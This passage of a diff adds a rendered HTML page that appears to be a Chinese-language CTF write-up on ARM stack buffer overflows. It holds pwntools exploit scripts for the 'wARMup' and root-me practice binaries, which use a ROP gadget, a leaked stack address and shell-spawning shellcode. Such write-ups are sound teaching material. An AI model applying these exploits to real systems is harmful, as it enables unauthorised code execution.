+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./wARMup&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./wARMup&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./wARMup&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">100</span><span class="c1">#104</span>
+<span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="mh">0x00010364</span>
+<span class="n">main_read</span> <span class="o">=</span> <span class="mh">0x00010530</span>
+
+<span class="c1"># payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">*</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="root_me_stack_buffer_overflow_basic">root_me_stack_buffer_overflow_basic<a class="headerlink" href="#root_me_stack_buffer_overflow_basic" title="Permanent link">&para;</a></h2>
+<h3 id="_28">基本情况<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h3>
+<p>32 位动态链接 arm 程序，存在 scanf 函数溢出，程序自身泄露栈地址。</p>
+<p>程序功能是可以重复向局部变量上写入，由于输入函数采用 scanf 长度被我们所控制。</p>
+<p>思路是先获取程序泄露的栈地址，然后写入 shellcode 控制 pc 跳转执行。这里用 cycli 测出来的 padding 是 0x50 ，实际调试发现需要填充 0x54 ，0x50-0x54 被填充在 r11 (fp) 。</p>
+<h3 id="exp_5">EXP<a class="headerlink" href="#exp_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./root_me_stack_buffer_overflow_basic&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;skye&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stack_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xA0</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+<span class="c1">#payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="_29"><a class="headerlink" href="#_29" title="Permanent link">&para;</a></h2>
                 
               
               
